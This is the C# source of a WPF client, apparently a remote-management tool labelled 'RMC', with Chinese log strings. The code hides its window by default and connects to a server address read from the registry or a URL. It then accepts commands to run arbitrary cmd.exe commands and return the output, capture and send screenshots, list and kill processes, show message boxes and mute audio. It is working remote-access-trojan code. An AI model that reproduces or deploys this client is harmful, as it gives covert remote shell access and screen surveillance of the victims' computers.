using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Net.Sockets;
using System.Threading;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.IO;
using Newtonsoft.Json;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Interop;
using Microsoft.Win32;
using Point = System.Drawing.Point;

namespace WpfApp1
{
    public partial class MainWindow : Window
    {
        private string ip_;
        private TcpClient _client;
        private NetworkStream _stream;
        private Thread _receiveThread;
        private string[] cmdType_str = { "normal", "test", "getTasksList", "MsgBox", "KillbyPID", "cmd", "mute", "capture" };
        string computerName = Environment.MachineName;
        private const int APPCOMMAND_VOLUME_MUTE = 0x80000;
        private const int WM_APPCOMMAND = 0x0319;

        public ObservableCollection<ProcessItem> Procs { get; set; } = new ObservableCollection<ProcessItem>();

        public MainWindow()
        {
            InitializeComponent();
            this.DataContext = this;

            this.Loaded += MainWindow_Loaded;
        }

        private void MainWindow_Loaded(object sender, RoutedEventArgs e)
        {
            if (!File.Exists("visible.txt"))
            {
                this.Hide();
            }
            Task.Run(() => InitConnection());
        }

        private void InitConnection()
        {
            string url = "http://127.0.0.1/sever.txt";
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"Software\RMC\Settings"))
                {
                    if (key != null)
                    {
                        string value = key.GetValue("ip_addr", url).ToString();
                        Dispatcher.Invoke(() => AppendMessage($"ip_addr: {value}"));
                        url = value;
                    }
                    else
                    {
                        Dispatcher.Invoke(() =>
                        {
                            AppendMessage("注册表键不存在");
                            log2File("注册表键不存在");
                            ShutdownSafe();
                        });
                        return;
                    }
                }
            }
            catch (Exception ex)
            {
                Dispatcher.Invoke(() => AppendMessage($"读取注册表失败: {ex.Message}，尝试本地服务器"));
                log2File($"读取注册表失败:{ex.Message}，尝试本地服务器");

            }

            try
            {
                using (HttpClient client = new HttpClient())
                {
                    string textContent = client.GetStringAsync(url).GetAwaiter().GetResult();
                    ip_ = textContent.Trim();
                    Dispatcher.Invoke(() =>
                    {
                        ip_TB.Text = ip_;
                        AppendMessage($"从服务器获取 IP 成功: {ip_}");
                        log2File($"从服务器获取 IP 成功: {ip_}");
                    });

                    var arr = ip_.Split(':');
                    if (arr.Length != 2)
                        throw new Exception("地址格式错误");

                    int pt = int.Parse(arr[1]);
                    ConnectToServer(arr[0], pt);
                }
            }
            catch (Exception ex)
            {
                Dispatcher.Invoke(() =>
                {
                    System.Windows.MessageBox.Show("连接服务器失败\n" + ex.Message, "错误", MessageBoxButton.OK, MessageBoxImage.Error);
                    ShutdownSafe();
                });
            }
        }

        private void ConnectToServer(string ip, int port)
        {
            try
            {
                _client = new TcpClient(ip, port);
                //_client.ReceiveTimeout = 10000;
                _client.SendTimeout = 10000;
                _stream = _client.GetStream();

                Dispatcher.Invoke(() => AppendMessage("成功连接服务器"));

                _receiveThread = new Thread(ReceiveLoop)
                {
                    IsBackground = true
                };
                _receiveThread.Start();

                sendPackage(1, "Hello " + computerName);
            }
            catch (Exception ex)
            {
                Dispatcher.Invoke(() =>
                {
                    AppendMessage("连接失败: " + ex.Message);
                    ShutdownSafe();
                });
            }
        }

        private void ReceiveLoop()
        {
            try
            {
                while (true)
                {
                    byte[] headerBuffer = new byte[8];
                    if (!isReadFully(_stream, headerBuffer, 8)) break;

                    int bodyLen = BitConverter.ToInt32(headerBuffer, 0);
                    int cmdType = BitConverter.ToInt32(headerBuffer, 4);

                    byte[] body = new byte[bodyLen];
                    if (!isReadFully(_stream, body, bodyLen)) break;

                    string bodyStr = Encoding.UTF8.GetString(body, 0, bodyLen);

                    Dispatcher.Invoke(() => HandleCommand(cmdType, bodyStr));
                }
            }
            catch (Exception ex)
            {
                Dispatcher.Invoke(() => AppendMessage("接收失败: " + ex.Message));
            }
            finally
            {
                ShutdownSafe();
            }
        }

        private void HandleCommand(int cmdType, string bodyStr)
        {
            AppendMessage($"[Server][{cmdType_str[cmdType]}] {bodyStr}");

            switch (cmdType)
            {
                case 1:
                    if (bodyStr == "1")
                        AppendMessage("服务器验证通过");
                        log2File("服务器验证通过");
                    break;
                case 2:
                    RefreshList();
                    string json = JsonConvert.SerializeObject(Procs.ToList());
                    sendPackage(2, json);
                    break;
                case 3:
                    new Thread(_ => System.Windows.MessageBox.Show(bodyStr, "System", MessageBoxButton.OK)).Start();
                    break;
                case 4:
                    if (int.TryParse(bodyStr, out int pid))
                    {
                        try
                        {
                            Process.GetProcessById(pid).Kill();
                            RefreshList();
                        }
                        catch (Exception ex)
                        {
                            sendPackage(0, $"Kill 失败: {ex.Message}");
                        }
                    }
                    break;
                case 5:
                    new Thread(ExcuteCmdAndReturn).Start(bodyStr);
                    break;
                case 6:
                    ToggleMute();
                    break;
                case 7:
                    byte[] capture = CaptureScreen();
                    _stream.Write(BitConverter.GetBytes(capture.Length), 0, 4);
                    _stream.Write(BitConverter.GetBytes(7), 0, 4);
                    _stream.Write(capture, 0, capture.Length);
                    break;
            }

            AppendMessage($"时间: {DateTime.Now:yyyy/MM/dd HH:mm:ss}");
            log2File($"时间: {DateTime.Now:yyyy/MM/dd HH:mm:ss}");
        }

        private void BtnSend_Click(object sender, RoutedEventArgs e)
        {
            string text = TxtInput.Text;
            if (string.IsNullOrEmpty(text) || _stream == null) return;
            sendPackage(0, text);
            AppendMessage("[Client]You: " + text);
            TxtInput.Clear();
        }

        private void BtnCmdType_Click(object sender, RoutedEventArgs e)
        {
            string text = TxtInput.Text;
            if (string.IsNullOrEmpty(text) || _stream == null) return;
            sendPackage(1, text);
            AppendMessage("[Client][test] " + text);
            TxtInput.Clear();
        }

        private void sendPackage(int cmdType_, string bodyStr)
        {
            try
            {
                byte[] body = Encoding.UTF8.GetBytes(bodyStr);
                byte[] len = BitConverter.GetBytes(body.Length);
                byte[] type = BitConverter.GetBytes(cmdType_);
                _stream.Write(len, 0, 4);
                _stream.Write(type, 0, 4);
                _stream.Write(body, 0, body.Length);
            }
            catch (Exception ex)
            {
                AppendMessage("发送失败: " + ex.Message);
                log2File("发送失败: " +ex.Message);
            }
        }

        private bool isReadFully(NetworkStream stream, byte[] buffer, int size)
        {
            int offset = 0;
            while (size > 0)
            {
                int read = stream.Read(buffer, offset, size);
                if (read <= 0) return false;
                offset += read;
                size -= read;
            }
            return true;
        }

        private void ExcuteCmdAndReturn(object cmd)
        {
            try
            {
                var psi = new ProcessStartInfo("cmd.exe", "/c " + cmd)
                {
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                var proc = new Process { StartInfo = psi };
                var sb = new StringBuilder();

                proc.OutputDataReceived += (s, e) => { if (e.Data != null) sb.AppendLine("INFO: " + e.Data); };
                proc.ErrorDataReceived += (s, e) => { if (e.Data != null) sb.AppendLine("ERROR: " + e.Data); };

                proc.Start();
                proc.BeginOutputReadLine();
                proc.BeginErrorReadLine();
                proc.WaitForExit();

                sendPackage(5, sb.ToString());
            }
            catch (Exception ex)
            {
                sendPackage(5, "执行命令失败: " + ex.Message);
            }
        }

        private void ToggleMute()
        {
            SendMessageW((IntPtr)0xFFFF, WM_APPCOMMAND, IntPtr.Zero, (IntPtr)APPCOMMAND_VOLUME_MUTE);
        }

        private void RefreshList()
        {
            Procs.Clear();
            foreach (var p in Process.GetProcesses())
            {
                try
                {
                    Procs.Add(new ProcessItem
                    {
                        Name = p.ProcessName,
                        PID = p.Id,
                        Module = p.MainModule.ModuleName
                    });
                }
                catch { }
            }
        }

        private void AppendMessage(string msg)
        {
            TxtMessages.AppendText(msg + "\n");
            TxtMessages.ScrollToEnd();
        }

        private void ShutdownSafe()
        {
            try
            {
                _stream?.Close();
                _client?.Close();
            }
            catch { }

            Dispatcher.Invoke(() =>
            {
                AppendMessage("程序退出...");
                log2File("程序退出...");
                System.Windows.Application.Current.Shutdown();
                Environment.Exit(0);
            });
        }

        protected override void OnClosed(EventArgs e)
        {
            base.OnClosed(e);
            Environment.Exit(0);
        }

        public static byte[] CaptureScreen()
        {
            var bounds = Screen.PrimaryScreen.Bounds;
            using (var bmp = new Bitmap(bounds.Width, bounds.Height))
            using (var g = Graphics.FromImage(bmp))
            {
                g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);
                using (var ms = new MemoryStream())
                {
                    bmp.Save(ms, ImageFormat.Jpeg);
                    return ms.ToArray();
                }
            }
        }

        [DllImport("user32.dll")]
        private static extern IntPtr SendMessageW(IntPtr hWnd, int Msg, IntPtr wParam, IntPtr lParam);

        public class ProcessItem
        {
            public string Name { get; set; }
            public int PID { get; set; }
            public string Module { get; set; }
        }

        private void MenuItemKill_Click(object sender, RoutedEventArgs e)
        {
            if (listView.SelectedItem is ProcessItem item)
            {
                var res = System.Windows.MessageBox.Show($"结束 {item.Name} (PID: {item.PID})?", "确认", MessageBoxButton.YesNo);
                if (res == MessageBoxResult.Yes)
                {
                    try
                    {
                        Process.GetProcessById(item.PID).Kill();
                        RefreshList();
                    }
                    catch (Exception ex)
                    {
                        sendPackage(0, "结束失败: " + ex.Message);
                    }
                }
            }
        }

        private void MenuItemRefresh_Click(object sender, RoutedEventArgs e)
        {
            RefreshList();
        }

        private void listView_MouseRightButtonUp(object sender, System.Windows.Input.MouseButtonEventArgs e)
        {
            if (listView.SelectedItem == null && listView.Items.Count > 0)
                listView.SelectedIndex = 0;
        }

        private void log2File(string msg)
        {
            string filePath = @"clientlog-" + DateTime.Now.ToString("yyyy-MM-dd") +".log";
            File.AppendAllText(filePath, msg + "\n");

        }
    }
}
